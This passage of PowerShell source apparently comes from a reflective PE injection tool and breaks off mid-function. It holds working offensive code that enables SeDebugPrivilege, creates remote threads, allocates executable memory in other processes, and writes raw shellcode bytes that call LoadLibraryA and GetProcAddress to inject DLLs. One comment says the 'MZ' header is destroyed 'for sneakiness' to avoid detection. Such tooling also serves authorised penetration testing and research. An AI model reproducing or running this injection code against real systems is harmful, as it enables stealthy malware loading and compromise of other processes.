		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
